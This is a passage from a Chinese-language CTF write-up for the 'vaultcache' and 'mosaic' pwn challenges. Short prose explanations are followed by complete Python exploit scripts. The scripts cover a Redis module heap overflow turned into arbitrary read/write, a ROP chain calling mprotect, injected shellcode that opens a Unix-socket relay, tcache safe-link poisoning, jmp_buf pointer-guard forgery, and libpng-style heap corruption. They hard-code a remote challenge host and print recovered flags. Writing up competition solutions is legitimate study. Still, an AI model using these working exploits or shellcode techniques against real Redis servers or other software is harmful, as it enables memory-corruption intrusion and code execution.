m=re.search(r'FLAG\[[^\]]*\]:(\S+)', txt)
if m:
    print('FLAG_CONTENT:', m.group(1))
else:
    print('[-] no flag parsed; tail:')
    print(txt[-3000:])
```

### vaultcache

vaultcach是一道 Redis 模块题。redis-server 7.2.16 加载 vaultcache.so，模块类型为保险库记录，提供放、取、打补丁与渲染接口，记录为 768 字节结构，包含长度、分配长度、数据指针、渲染回调与自身指针；seccomp 除 execve 与 execveat 外全部放行。模块内隐藏回调会把调用它的 Redis 客户端 TCP 文件描述符代理到 broker 的 unix socket，文件描述符的推导链为上下文加 0x10 指向客户端，客户端加 0x10 指向连接，连接加 0x10 是整数文件描述符。第一阶段的入口是渲染接口把上下文与 PIE 寄存器泄露到数据区，算出 PIE 基址；再用转储与恢复构造模块载荷，产生八字节 jemalloc 溢出写进相邻的字符串对象，把标志改成三、长度改成 0x100000 后，取出操作返回一兆字节的堆越界转储；通过记录结构里错位的自身指针恢复堆地址、活动记录与模块基址，随后用范围写改写活动记录的长度、分配长度、数据指针、回调与自身指针，得到任意读写。

第一版利用在本地用栈劫持跑通：打补丁处理器的栈指针位于上下文减八，覆盖返回地址并在偏移 0x200 处放 shellcode，ROP 调用 mprotect 后读 flag，本地五次全部成功。但远程 shellcode 版本两次把 Redis 进程打挂，一次在堆执行处崩溃，一次在系统调用阶段；线上 Redis 用户读取 flag 文件返回权限错误，直接读文件这条路被否证。最终改用模块代理：改写活动记录，把数据指针指向上下文、把回调改为模块中隐藏的代理函数，触发补丁后客户端连接被接到 broker 的 unix socket，进入 VLTB3 槽协议。

VLTB3 使用五字节头与槽协议，利用槽 12 到 15 与静态缓冲区别名、释放后使用：对 0x330 块做 safe-link 投毒并把分配落到指定地址，泄露模块内函数地址得到 PIE；用 unsorted bin 的 0x510 块泄露 libc；对 0x3d0 的释放对做投毒，回收后读出 jmp_buf 得到指针保护值。随后改写该块，伪造跳转环境，把栈指针与恢复地址设置为混合后的中继函数地址；发送触发类型后执行 longjmp，进入原本不可达的中继函数，它在文件描述符 7 上发出保险库与账本字样并把后续流量中继给账本。通过中继复用已验证的账本协议，0x7F 泄露、四次 0x10 负索引读表、0x11 解锁得到 0x81，许可链返回议会字样；议会阶段再完成问候、密钥恢复、计划提交与门投放，0x40 返回 41 字节 flag。远程对 1.14.76.59:24123 一次完成全链，得到 DASCTF{94909316515280660449476557139470}。本题的转折在于放弃 shellcode 直接读 flag，改用题目自带的代理回调进入 broker，并通过释放后使用与 jmp_buf 劫持到达 broker 中看似不可达的中继函数。

本题的完整利用脚本如下，实例地址、端口、会话令牌等运行参数需按实际环境调整。

Redis 客户端封装的代码如下。

```python
#!/usr/bin/env python3
import socket, sys, struct

HOST='127.0.0.1'; PORT=6399

class R:
    def __init__(self, host=HOST, port=PORT, timeout=5):
        self.s = socket.create_connection((host,port), timeout=timeout)
        self.f = self.s.makefile('rb')
    def cmd(self, *args):
        out = b'*%d\r\n' % len(args)
        for a in args:
            if isinstance(a, str): a = a.encode()
            out += b'$%d\r\n' % len(a) + a + b'\r\n'
        self.s.sendall(out)
        return self.read()
    def read(self):
        line = self.f.readline()
        if not line: raise EOFError
        t, rest = line[:1], line[1:-2]
        if t == b'+': return rest
        if t == b'-': return Exception(rest.decode('latin1'))
        if t == b':': return int(rest)
        if t == b'$':
            n = int(rest)
            if n < 0: return None
            data = self.f.read(n); self.f.read(2)
            return data
        if t == b'*':
            n = int(rest)
            if n < 0: return None
            return [self.read() for _ in range(n)]
        raise ValueError(line)

if __name__ == '__main__':
    r = R()
    for a in sys.argv[1:]:
        pass
    print(r.cmd(*sys.argv[1:]))
```

保险库记录封装的代码如下。

```python
#!/usr/bin/env python3
import struct, sys
sys.path.insert(0, '/home/lzl402/Desktop/ctf/DASCTF-2026/PWN-vaultcache/lab')
from rcli import R

MOD_ID = bytes.fromhex('55aba5b5179cb000')  # BE as stored after 0x81
POLY = 0x95ac9329ac4bc9b5

def crc64(data, crc=0):
    for b in data:
        crc ^= b
        for _ in range(8):
            crc = (crc >> 1) ^ (POLY if crc & 1 else 0)
    return crc & 0xffffffffffffffff

def rdb_len(n):
    if n < (1 << 6):
        return bytes([n & 0x3f])
    elif n < (1 << 14):
        return bytes([0x40 | (n >> 8), n & 0xff])
    elif n <= 0xffffffff:
        return b'\x80' + struct.pack('>I', n)
    else:
        return b'\x81' + struct.pack('>Q', n)

def vault_blob(data, alloc):
    """Craft a RESTORE serialized value for the vault module type.
    data: bytes actually written by rdb_load (copied), alloc: Unsigned size checked."""
    body = b'\x07'
    body += b'\x81' + MOD_ID
    body += b'\x02' + rdb_len(alloc)          # SaveUnsigned(alloc)
    body += b'\x05' + rdb_len(len(data)) + data  # SaveStringBuffer(data)
    body += b'\x00'                            # RDB_MODULE_OPCODE_EOF
    ver = struct.pack('<H', 11)
    crc = crc64(body + ver)
    return body + ver + struct.pack('<Q', crc)

def restore(r, key, blob, ttl=0):
    return r.cmd('RESTORE', key, str(ttl), blob)

if __name__ == '__main__':
    r = R()
    print(r.cmd('PING'))
    blob = vault_blob(b'B' * 768, 768)
    print('blob len', len(blob), blob[:24].hex())
    print(restore(r, 'rtest', blob))
    print('get type', type(r.cmd('VAULT.GET', 'rtest')), len(r.cmd('VAULT.GET', 'rtest') or b''))
    g = r.cmd('VAULT.GET', 'rtest')
    print(g[:8] if isinstance(g, bytes) else g)
```

模块溢出与代理的代码如下。

```python
import sys, struct, socket, os, time
LAB='/home/lzl402/Desktop/ctf/DASCTF-2026/PWN-vaultcache/panel2'
sys.path.insert(0,LAB)
from rcli import R
from vault import vault_blob, restore
P64=lambda x: struct.pack('<Q',x)
Q64=lambda b,o: struct.unpack_from('<Q',b,o)[0]

POP_RDI=0x7701f; POP_RSI=0x7b10e; POP_RAX=0xf58ff; POP_RCX=0x158b53
POP_RDX_IMM=0x92522   # pop rdx ; ret 0x1f
MPROTECT_PLT=0x74f60

def leak_setup(r):
    # render leak for ctx + redis pie base
    r.cmd('VAULT.PUT','lk', b'A'*768)
    r.cmd('VAULT.RENDER','lk')
    g=r.cmd('VAULT.GET','lk')
    regs=struct.unpack_from('<7Q',g,0x48)
    return regs

FILLERS=384
def corrupt_and_leak(r, LEAK=0x100000):
    # absorb pre-existing 768-class free holes so our sds run is contiguous
    for i in range(FILLERS): r.cmd('SET','f%03d'%i, bytes([0x30+(i%10)])*760)
    for i in range(16): r.cmd('SET','s%02d'%i, bytes([0x41+i])*760)
    r.cmd('VAULT.PUT','rk', b'R'*768)
    r.cmd('DEL','s08'); r.cmd('DEL','s00')
    payload=bytearray(b'C'*768); payload[764:768]=struct.pack('<I',LEAK)
    payload+=bytes([0x41,0x41,0x41,0x41,3,0x41,0x41,0x41])
    restore(r,'ov', vault_blob(bytes(payload),768))
    # the 8-byte overflow corrupts the sds header of whichever 768-class chunk
    # physically follows the RESTORE data buffer; find that key dynamically.
    def strlen_is_leak(k):
        v=r.cmd('STRLEN',k)
        return isinstance(v,int) and v==LEAK
    cands=['s%02d'%i for i in range(16)]+['f%03d'%i for i in range(FILLERS)]
    key=None
    for k in cands:
        if strlen_is_leak(k): key=k; break
    if key is None:
        ks=r.cmd('KEYS','*')
        if isinstance(ks,list):
            tried=set(cands)
            for kk in ks:
                k=kk.decode('latin1') if isinstance(kk,bytes) else kk
                if k in tried: continue
                if strlen_is_leak(k): key=k; break
    if key is None: raise RuntimeError('leak failed (no corrupted key found)')
    blob=r.cmd('GET',key)
    if not isinstance(blob,bytes) or len(blob)!=LEAK: raise RuntimeError('leak get failed')
    print('[*] corrupted key=%s'%key)
    U=lambda o: struct.unpack_from('<Q',blob,o)[0]
    for i in range(0x20,len(blob)-0x28):
        try:
            if U(i)!=768 or U(i+8)!=768: continue
        except struct.error: break
        cb=U(i+0x18); sl=U(i+0x20)
        if 0x100000000000<sl<0x800000000000 and (cb&0xfff)==0x1e0:
            return dict(off=i, base=sl-i, datap=U(i+0x10), cb=cb, self=sl, modbase=cb-0x81e0, key=key), blob
    raise RuntimeError('record not found')

def set_record(r, rec, datap, length, cb=0):
    val=P64(length)+P64(length)+P64(datap)+P64(cb)+P64(rec['self'])
    r.cmd('SETRANGE',rec['key'],str(rec['off']), val)

def magic_read(r, rec, addr, n=0x400):
    set_record(r, rec, addr, max(n,0x100))
    b=r.cmd('VAULT.GET','rk')
    if not isinstance(b,bytes): raise RuntimeError('read fail %r'%b)
    return b

def build_payload(T, ctx, getapi, client, flagsq, pie, shellbytes, path):
    S=0x200
    sh=bytearray(shellbytes)
    # patch ctx imm at sh[2:10]
    sh[2:10]=P64(ctx)
    # patch path at offset 143 (32 bytes)
    pb=path+b'\x00'
    sh[143:143+len(pb)]=pb
    shell_addr=T+S
    page=shell_addr & ~0xfff
    pay=bytearray(S+len(sh))
    chain_off=0x40
    def put(off,val): pay[off:off+8]=P64(val)
    put(0x00, pie+POP_RDI)      # A: pop dummy getapifuncptr
    put(0x08, getapi)
    put(0x10, pie+POP_RSI)      # B: pop client
    put(0x18, client)
    put(0x20, pie+POP_RAX)      # C: pop dummy
    put(0x28, 0xdeadbeef)
    put(0x30, pie+POP_RCX)      # D: pop flags
    put(0x38, flagsq)
    # real chain at 0x40
    put(0x40, pie+POP_RDI); put(0x48, page)
    put(0x50, pie+POP_RSI); put(0x58, 0x2000)
    put(0x60, pie+POP_RDX_IMM); put(0x68, 7); put(0x70, pie+MPROTECT_PLT)
    # after ret 0x1f: rsp = &0x78 + 0x1f = 0x97
    put(0x97, shell_addr)
    pay[S:S+len(sh)]=sh
    return bytes(pay)

def exploit(host='127.0.0.1', port=6399, flag_path=b'/home/ctf/council.flag', shell='shell.bin', timeout=6):
    r=R(host,port,timeout=timeout)
    regs=leak_setup(r)
    ctx=regs[4]; pie=regs[1]-0x381260
    print('[*] ctx=%#x pie=%#x'%(ctx,pie))
    rec,blob=corrupt_and_leak(r)
    print('[*] record=%#x leakbase=%#x'%(rec['self'],rec['base']))
    c=magic_read(r, rec, ctx, 0x400)
    if not isinstance(c,bytes) or len(c)<0x400: raise RuntimeError('ctx read failed')
    getapi=Q64(c,0x00); client=Q64(c,0x10); flagsq=Q64(c,0x30)
    print('[*] getapi=%#x client=%#x flags=%#x'%(getapi,client,flagsq))
    # sanity: getapi is the module API thunk in redis PIE (low12 0xaf0);
    # abort before following bogus pointers if the record/leak is unexpected.
    if (getapi & 0xfff)!=0xaf0: raise RuntimeError('sanity: getapi %#x'%getapi)
    if not (0x100000000000 < client < 0x800000000000): raise RuntimeError('sanity: client %#x'%client)
    cl=magic_read(r, rec, client, 0x200)
    if not isinstance(cl,bytes) or len(cl)<0x200: raise RuntimeError('client read failed')
    conn=Q64(cl,0x10)
    if not (0x100000000000 < conn < 0x800000000000): raise RuntimeError('sanity: conn %#x'%conn)
    cn=magic_read(r, rec, conn, 0x100)
    if not isinstance(cn,bytes) or len(cn)<0x100: raise RuntimeError('conn read failed')
    fd=struct.unpack_from('<i',cn,0x10)[0]
    print('[*] conn=%#x fd=%d'%(conn,fd))
    if fd < 0 or fd > 65535: raise RuntimeError('sanity: fd %d'%fd)
    sh=bytearray(open(os.path.join(LAB,shell),'rb').read())
    # FIX: the payload region below rsp is clobbered by lazy PLT resolution of
    # mprotect (ld.so resolver frame) between chain execution and shellcode.
    # Do not dereference ctx/client from stack; embed the live client fd as an
    # immediate in the shellcode itself (shellcode is above rsp, safe).
    sh[0x22:0x2e] = b'\x41\xbc' + struct.pack('<I', fd) + b'\x90'*6
    T=ctx-8
    pay=build_payload(T, T+8, getapi, client, flagsq, pie, sh, flag_path)
    print('[*] payload len',len(pay))
    set_record(r, rec, T, 0x10000)
    # send PATCH raw; hijacks after reply
    body=b'*4\r\n$11\r\nVAULT.PATCH\r\n$2\r\nrk\r\n$1\r\n0\r\n$%d\r\n%s\r\n'%(len(pay),pay)
    r.s.sendall(body)
    time.sleep(0.4)
    out=b''
    r.s.settimeout(4.0)
    try:
        while True:
            d=r.s.recv(4096)
            if not d: break
            out+=d
            if b'}' in out: break
    except Exception: pass
    return out

if __name__=='__main__':
    path=(sys.argv[1].encode() if len(sys.argv)>1 else b'/tmp/vb/council.flag')
    print('flag_path',path)
    try:
        out=exploit(flag_path=path)
        print('RAW OUT:', out[:400])
    except Exception as e:
        import traceback; traceback.print_exc()
```

中继利用的代码如下。

```python
#!/usr/bin/env python3
"""12076 vaultcache remote one-shot v4: heap-exec AF_UNIX relay.
Usage: exploit_relay.py <host> <port> <unix_path> [readtimeout]
Writes shell6 (socket/connect/poll/relay) into the known rk record data buffer,
mprotects the heap pages, jumps there. After 'OK\\n' the TCP connection is a raw
relay to <unix_path> (e.g. /run/redisrelay/ledger/routeledger.sock). On connect
failure 8 bytes = -errno are sent instead.
"""
import sys, re, struct, os, time
LAB='/home/lzl402/Desktop/ctf/DASCTF-2026/PWN-vaultcache/panel2'
sys.path.insert(0,LAB)
import stage2_robust as S
P64=lambda x: struct.pack('<Q',x)
Q64=lambda b,o: struct.unpack_from('<Q',b,o)[0]
POP_RDI=0x7701f; POP_RSI=0x7b10e; POP_RAX=0xf58ff; POP_RCX=0x158b53
POP_RDX_IMM=0x92522; MPROTECT_PLT=0x74f60
DATA_OFF=0x100; D_SA=0x00; D_PF=0x80; D_BUF=0x100

def make_data(path):
    d=bytearray(0x1100)
    struct.pack_into('<H',d,D_SA,1)
    p=path if isinstance(path,bytes) else path.encode()
    if len(p)>107: raise ValueError('path too long')
    d[D_SA+2:D_SA+2+len(p)]=p
    return bytes(d)

def patch_sh(T, fd):
    sh=bytearray(open(os.path.join(LAB,'shell6.bin'),'rb').read())
    struct.pack_into('<I',sh,0x02,fd)
    base=T+DATA_OFF
    for off,addr in [(0x08,base+D_SA),(0x5e,base+D_PF),(0xc0,base+D_BUF),(0xe4,base+D_BUF)]:
        struct.pack_into('<Q',sh,off,addr)
    return bytes(sh)

def exploit(host='127.0.0.1', port=6399, path='/run/redisrelay/ledger/routeledger.sock', timeout=10.0, readwin=10.0):
    r=S.R(host,port,timeout=timeout)
    regs=S.leak_setup(r)
    ctx=regs[4]; pie=regs[1]-0x381260
    print('[*] ctx=%#x pie=%#x'%(ctx,pie))
    rec,blob=S.corrupt_and_leak(r)
    c=S.magic_read(r,rec,ctx,0x400)
    getapi=Q64(c,0); client=Q64(c,0x10); flagsq=Q64(c,0x30)
    print('[*] getapi=%#x client=%#x'%(getapi,client))
    if (getapi&0xfff)!=0xaf0: raise RuntimeError('sanity getapi')
    if not (0x100000000000<client<0x800000000000): raise RuntimeError('sanity client')
    cl=S.magic_read(r,rec,client,0x200); conn=Q64(cl,0x10)
    cn=S.magic_read(r,rec,conn,0x100); fd=struct.unpack_from('<i',cn,0x10)[0]
    print('[*] fd=%d'%fd)
    T=ctx-8
    heap=rec['datap']
    sh=patch_sh(T,fd)
    S.set_record(r,rec,heap,0x300)
    rep=r.cmd('VAULT.PATCH','rk','0',sh)
    print('[*] heap code ->',rep)
    if rep!=len(sh): raise RuntimeError('heap write fail')
    data=make_data(path)
    page=heap & ~0xfff
    mplen=0x1000 if ((heap&0xfff)+len(sh))<=0x1000 else 0x2000
    pay=bytearray(DATA_OFF+len(data))
    def put(off,val): pay[off:off+8]=P64(val)
    put(0x00,pie+POP_RDI); put(0x08,getapi)
    put(0x10,pie+POP_RSI); put(0x18,client)
    put(0x20,pie+POP_RAX); put(0x28,0xdeadbeef)
    put(0x30,pie+POP_RCX); put(0x38,flagsq)
    put(0x40,pie+POP_RDI); put(0x48,page)
    put(0x50,pie+POP_RSI); put(0x58,mplen)
    put(0x60,pie+POP_RDX_IMM); put(0x68,7)
    put(0x70,pie+MPROTECT_PLT)
    put(0x97,heap)
    pay[DATA_OFF:]=data
    S.set_record(r,rec,T,0x10000)
    body=b'*4\r\n$11\r\nVAULT.PATCH\r\n$2\r\nrk\r\n$1\r\n0\r\n$%d\r\n%s\r\n'%(len(pay),pay)
    r.s.sendall(body)
    time.sleep(0.3)
    r.s.settimeout(readwin)
    return r,bytes(pay)

if __name__=='__main__':
    host=sys.argv[1]; port=int(sys.argv[2]); path=sys.argv[3] if len(sys.argv)>3 else '/run/redisrelay/ledger/routeledger.sock'
    r,pay=exploit(host,port,path)
    try: first=r.s.recv(16)
    except Exception as e: first=b'<timeout>'
    print('[*] relay first bytes:',repr(first), 'plen',len(pay))
    if first==b'OK\n':
        r.s.sendall(b'RL5/VAULT/LEDGER')
        try: print('[*] echo:',repr(r.s.recv(64)))
        except Exception as e: print('[*] recv exc',e)
```

远程全链驱动的代码如下。

```python
#!/usr/bin/env python3
"""12076 vaultcache COMPLETE remote chain.
relay -> /tmp/vault-broker.sock (VLTB3) -> broker tcache/jmp_buf exploit ->
'T' longjmp -> sub_145A relay to routeledger (opener sent by broker) ->
ledger unlock+permit (proven) -> routecouncil permit+gate (redisrelay-proven).
Usage: remote_full.py <host> <port>"""
import sys,struct,time,re
LAB='/home/lzl402/Desktop/ctf/DASCTF-2026/PWN-vaultcache/panel2'
sys.path.insert(0,LAB)
import exploit_relay as X
M=(1<<64)-1
def rol(x,n):
    n&=63; return ((x<<n)|(x>>((64-n)&63)))&M if n else x&M
def ror(x,n):
    n&=63; return ((x>>n)|(x<<((64-n)&63)))&M if n else x&M
def unxorshift(y,s):
    x=y&M
    for _ in range((64+s-1)//s): x=(y^(x>>s))&M
    return x&M
class B:
    def __init__(self,s): self.s=s
    def cmd(self,t,payload=b'',is_r=False):
        self.s.sendall(t.encode()+struct.pack('>I',len(payload))+payload)
        if is_r:
            b=b''
            self.s.settimeout(6)
            while len(b)<8:
                try: d=self.s.recv(8-len(b))
                except Exception: break
                if not d: break
                b+=d
                if len(b)<8 and b.endswith(b'\n'): break
            return b
        b=b''
        self.s.settimeout(6)
        while not b.endswith(b'\n'):
            try: d=self.s.recv(16)
            except Exception: break
            if not d: break
            b+=d
        return b
    def C(self,slot,typ,data=b''): return self.cmd('C',bytes([slot,typ])+data)
    def F(self,slot): return self.cmd('F',bytes([slot]))
    def R(self,slot,off): return self.cmd('R',bytes([slot,(off>>8)&0xff,off&0xff]),is_r=True)
    def E(self,slot,off,val): return self.cmd('E',bytes([slot,(off>>8)&0xff,off&0xff])+struct.pack('<Q',val&M))
    def S(self): return self.cmd('S')
    def G(self): return self.cmd('G')
    def T(self): return self.cmd('T')
def q(b):
    if len(b)!=8: raise RuntimeError('short read %r'%b)
    return struct.unpack('<Q',b)[0]
def broker_exploit(s, verbose=True):
    b=B(s)
    def P(*a):
        if verbose: print(*a,flush=True)
    P('[*] broker: tcache pair + safe-link')
    for r in (b.C(0,3),b.C(1,3),b.F(0),b.F(1)):
        if r!=b'OK\n': raise RuntimeError('cmd %r'%r)
    slot0=unxorshift(q(b.R(1,0)),12); slot1=slot0+0x340
    q5248=slot0-0x1280; q5260=slot0-0x820; q5268=slot0-0x440
    P('    slot0=%#x q5248=%#x q5260=%#x'%(slot0,q5248,q5260))
    if b.E(1,0,q5248^(slot1>>12))!=b'OK\n': raise RuntimeError('E1')
    for r in (b.C(2,3),b.C(3,3)):
        if r!=b'OK\n': raise RuntimeError('cmd2/3 %r'%r)
    magic=q(b.R(3,32)); P('    magic=%#x'%magic)
    if magic!=0x5641554c54303033: raise RuntimeError('bad q5248 magic (layout)')
    PIE=q(b.R(3,24))-0x1309; P('    PIE=%#x'%PIE)
    if PIE&0xfff: raise RuntimeError('PIE not aligned')
    P('[*] broker: libc via unsorted bin')
    for r in (b.C(4,1),b.C(5,1)):
        if r!=b'OK\n': raise RuntimeError('cmd4/5 %r'%r)
    if b.F(4)!=b'OK\n': raise RuntimeError('F4')
    libc=q(b.R(4,0))-0x1d3cc0
    P('    libc=%#x'%libc)
    if libc&0xfff: raise RuntimeError('libc not aligned')
    rd=libc+0xf82a0
    P('[*] broker: 0x3d0 pair -> q5260 jmp_buf')
    if b.G()!=b'OK\n': raise RuntimeError('G')
    if b.E(15,0,q5260^(q5268>>12))!=b'OK\n': raise RuntimeError('E15')
    for r in (b.C(9,0),b.C(10,0),b.F(10)):
        if r!=b'OK\n': raise RuntimeError('cmd9/10/F10 %r'%r)
    env=[q(b.R(10,0x40+8*i)) for i in range(9)]
    P('    env7=%#x'%env[7])
    guard=ror(env[7],17)^(PIE+0x2116)
    if (ror(env[7],17)^guard)!=(PIE+0x2116): raise RuntimeError('guard selfcheck')
    sub132c=(rol((q5260^(PIE+0x1309)^rd)&M,23)^0x8B7D51E29AC4630F)&M
    fake=bytearray(0x100)
    struct.pack_into('<Q',fake,0x20,sub132c)
    env[7]=rol(((PIE+0x145A)^guard)&M,17); env[8]=0
    for i,x in enumerate(env): struct.pack_into('<Q',fake,0x40+8*i,x)
    P('    sub132C=%#x relay=%#x'%(sub132c,PIE+0x145A))
    if b.C(11,0,bytes(fake))!=b'OK\n': raise RuntimeError('C11 fake')
    P('[*] broker: firing T -> longjmp -> sub_145A relay')
    b.s.sendall(b'T'+struct.pack('>I',0))
    time.sleep(0.4)
    return PIE

def main():
    host=sys.argv[1]; port=int(sys.argv[2])
    r,pay=X.exploit(host,port,'/tmp/vault-broker.sock',readwin=10)
    s=r.s; s.settimeout(6)
    first=s.recv(16); print('[*] relay first:',repr(first),flush=True)
    if first!=b'OK\n': print('[!] broker socket connect failed',first.hex()); return
    b=b''
    while b'VLTB3' not in b:
        try: d=s.recv(16)
        except Exception: break
        if not d: break
        b+=d
    print('[*] broker banner:',repr(b),flush=True)
    try: PIE=broker_exploit(s)
    except Exception as e:
        import traceback; traceback.print_exc(); print('[!] broker stage failed'); return
    # ---- ledger channel (opener already sent by sub_145A) ----
    import ledger_direct as LD, council_proven as CP
    Ld=LD.Pipe(s)
    print('[*] ledger protocol (opener already sent)',flush=True)
    try:
        ok=LD.run_protocol(Ld, do_council=False)
    except Exception as e:
        import traceback; traceback.print_exc(); ok=False
    print('[*] ledger ok:',ok,flush=True)
    if ok:
        try:
            res=CP.run(Ld)
            print('[=] council result:',res)
        except Exception as e:
            import traceback; traceback.print_exc()
if __name__=='__main__': main()
```

模块代理入口的代码如下。

```python
#!/usr/bin/env python3
"""Module-proxy path: stage1 record overwrite -> cb=sub_8940 proxies our TCP
connection to /tmp/vault-broker.sock -> VLTB3 broker exploit -> ledger -> council.
Usage: remote_proxy.py <host> <port>"""
import sys,struct,time
LAB='/home/lzl402/Desktop/ctf/DASCTF-2026/PWN-vaultcache/panel2'
sys.path.insert(0,LAB)
import stage2_robust as S
import remote_full as RF
P64=lambda x: struct.pack('<Q',x)

def main():
    host=sys.argv[1]; port=int(sys.argv[2])
    r=S.R(host,port,timeout=10)
    regs=S.leak_setup(r); ctx=regs[4]
    print('[*] ctx=%#x'%ctx,flush=True)
    rec,blob=S.corrupt_and_leak(r)
    proxy=rec['modbase']+0x8940
    print('[*] record=%#x modbase=%#x proxy=%#x'%(rec['self'],rec['modbase'],proxy),flush=True)
    val=P64(0)+P64(0)+P64(ctx)+P64(proxy)+P64(rec['self'])
    rep=r.cmd('SETRANGE',rec['key'],str(rec['off']),val)
    print('[*] setrange reply',rep,flush=True)
    r.s.sendall(b'*2\r\n$12\r\nVAULT.RENDER\r\n$2\r\nrk\r\n')
    s=r.s; s.settimeout(8)
    try: first=s.recv(16)
    except Exception as e: first=b'<timeout %r>'%e
    print('[*] proxy first bytes:',repr(first),flush=True)
    if first!=b'VLTB3\n':
        # maybe banner plus more arrived together
        if b'VLTB3' not in first: print('[!] no VLTB3 banner'); return
    try: PIE=RF.broker_exploit(s)
    except Exception:
        import traceback; traceback.print_exc(); print('[!] broker stage failed'); return
    import ledger_direct as LD, council_proven as CP
    Ld=LD.Pipe(s)
    print('[*] ledger protocol (opener already sent by sub_145A)',flush=True)
    try: ok=LD.run_protocol(Ld, do_council=False)
    except Exception:
        import traceback; traceback.print_exc(); ok=False
    print('[*] ledger ok:',ok,flush=True)
    if ok:
        try: print('[=] council result:',CP.run(Ld))
        except Exception:
            import traceback; traceback.print_exc()
if __name__=='__main__': main()
```

### mosaic

mosaic是一道六段中继链题。调用链为 worker、broker、keeper、seal、routeledger 与 routecouncil，末端议会读取 flag。远程 worker 使用 libpng 1.6.43 风格布局，通过命中二分测出画布地址与另一个地址的固定差值，并确定调色板对象是第二个被释放的块；按该布局构造 PNG 解压与释放序列，拿到 worker 的任意读写与控制流。随后按顺序完成 worker 到 broker、keeper、seal 的帧封装与对象复用，seal 最终返回一条到账本的原始中继，此后每层下游响应都由上游原样回传。

账本段与 redisrelay 同源。先用 0x7F 泄露四个槽的混合值，再用四次 0x10 命令按负索引起点读取全部 24 个表项，每条命令使用特殊操作码与自校验和；由表项恢复随机数、四个密钥、两个盐与全局值，发送 0x11 得到 0x81 解锁；随后用 0x20 到 0x24 构造许可结构，用 0x30 到 0x34 构造中继结构，0x40 通过校验返回议会字样。议会段先用 0x7F 问候得到目标地址、校验门与 PIE 关系，再用四次 0x10 命令把末位参数字节取 0xFC 到 0xFF，从乱序表恢复议会密钥；用 0x20 提交 1024 字节计划，前 32 项由混合函数生成，并在偏移 0x100 处嵌入校验门；随后用 0x30 到 0x32 泄露、0x33 投毒、0x34 发送 0x2F0 长度载荷，把门镜像放到目标地址，0x40 触发外层门，返回 41 字节 flag。

与 redisrelay 的同源议会相比，本构建唯一的差异是外层门中 flag 发送函数的地址：本构建的发送函数位于 PIE 加 0x2C90，而 redisrelay 的构建位于 PIE 加 0x2C80；其余标签、魔数、哈希与地址完全一致。远程对 1.14.76.59:19229 一次完成全链，得到 DASCTF{39348558134383104253551064768922}。本题的核心是协议同源加布局指纹：先把 worker 到 seal 的中继打通，再把已验证的账本与议会公式移植过来，只按远程构建修正发送地址这一个偏移。

本题的完整利用脚本如下，实例地址、端口、会话令牌等运行参数需按实际环境调整。

worker 读写封装的代码如下。

```python
import socket,struct,zlib,time,sys
HOST='1.14.76.59'; PORT=19229
M=(1<<64)-1
def chunk(t,d): return struct.pack('>I',len(d))+t+d+struct.pack('>I',zlib.crc32(t+d)&0xffffffff)
def png(pix,pal=None):
    if pal is None: pal=bytes((i*11)&0xff for i in range(768))
    raw=b'\x00'+bytes(pix[0:3])+b'\x00'+bytes(pix[3:6])
    return b'\x89PNG\r\n\x1a\n'+chunk(b'IHDR',struct.pack('>IIBBBBB',3,2,8,3,0,0,0))+chunk(b'PLTE',pal)+chunk(b'IDAT',zlib.compress(raw,9))+chunk(b'IEND',b'')
def solve_P(fd,d1):
    out=[]
    for low in range(0,0x1000,0x10):
        S=(low+d1)&M; t=S&0xfff; c=(S>>12)&M
        r=(fd&0xfff)^t; t2=r+c
        if t2>=0x1000: continue
        W=(fd>>12)^t2; H=0
        for i in range(W.bit_length()+24):
            wi=(W>>i)&1
            if i>=12: wi^=(H>>(i-12))&1
            H|=wi<<i
        page=(H<<12)|r; P=(page<<12)|low
        if (page ^ ((P+d1)&M))&M == fd and 0x400000000000 <= P < (1<<48):
            out.append(P)
    return out
class C:
    def __init__(s):
        s.s=socket.create_connection((HOST,PORT),timeout=5); s.s.settimeout(6)
    def send(s,op,d=b''):
        if isinstance(op,str): op=ord(op)
        s.s.sendall(bytes([op])+struct.pack('>I',len(d))+d)
    def recvn(s,n):
        b=b''
        while len(b)<n:
            d=s.s.recv(n-len(b))
            if not d: raise EOFError(b)
            b+=d
        return b
    def st(s): return s.recvn(3)
def attempt(model,d1,verbose=True):
    log=print if verbose else (lambda *a,**k:None)
    c=C(); pix=[0,1,2,3,4,5]
    c.send('L',png(pix)); r=c.st()
    if r!=b'OK\n': log('L fail',r); return None
    c.send('D'); r=c.st()
    buf=b''
    for i in range(6): c.send('V',bytes([i])); buf+=c.recvn(3)
    fd=struct.unpack('<Q',buf[0:8])[0]
    Ps=solve_P(fd,d1)
    if len(Ps)!=1: log('P solve',model,[hex(x) for x in Ps]); return None
    P=Ps[0]; page=P>>12
    if model=='43':
        ptr=P-0x310; canvas=P-0x980; dest=P+0x9fc0; T=canvas+0x30
    else:
        ptr=P-0x6b0; canvas=P+0x3b0; dest=P+0xa7b0; T=canvas+0x30
    log('[*] %s fd=%#x P=%#x ptr=%#x canvas=%#x dest=%#x'%(model,fd,P,ptr,canvas,dest))
    # state machine sequence
    for op in ('E','F','D','K','E','D'):
        c.send(op, bytes(18) if op=='E' else b''); r=c.st()
        if r!=b'OK\n': log(op,'fail',r); return None
    enc=page ^ T
    b=enc.to_bytes(8,'little')
    for idx,seg in ((0,b[0:3]),(1,b[3:6])):
        c.send('C',bytes([idx])+seg); r=c.st()
        if r!=b'OK\n': log('C fail',r); return None
    c.send('E',bytes(18)); r=c.st()
    log('E3',r)
    if r!=b'OK\n': return None
    payload=bytearray(768); struct.pack_into('<Q',payload,0x50,dest)
    c.send('T',bytes(payload)); r=c.st(); log('T',r)
    if r!=b'OK\n': return None
    c.send('Q',struct.pack('<h',0))
    try:
        q=c.recvn(8); log('[+] Q0 =',q.hex()); return True
    except Exception as e:
        log('Q fail',repr(e)); return False
if __name__=='__main__':
    model=sys.argv[1] if len(sys.argv)>1 else '43'
    d1=-0x310 if model=='43' else -0x6b0
    print('RESULT',attempt(model,d1))
```

worker 利用的代码如下。

```python
import socket, struct, time, sys, zlib
from pwn import asm, context
context.arch='amd64'
import wtest

# ---- layout constants measured under jammy libpng16 1.6.37 + provided libc 2.35
P_LOW12      = 0x7e0
PTR_DELTA    = 0x9fc0          # ptr - palette
CANVAS_DELTA = 0xa4a0          # canvas - palette
DEST_DELTA   = 0xa7b0          # png_struct copy - palette
Q9080_DELTA  = -0x6b0          # qword_9080[0] - palette (K chunk0)
# ---- libc offsets
OFF_LIBC_LEAK   = 0x421f0      # value at dest+0xc8
OFF_POP_RDI     = 0x2a3e5
OFF_POP_RSI     = 0x2be51
OFF_POP_RDX_R12 = 0x11f437
OFF_MPROTECT    = 0x11ebf0
PIE_LEAVE_RET   = 0x1a66
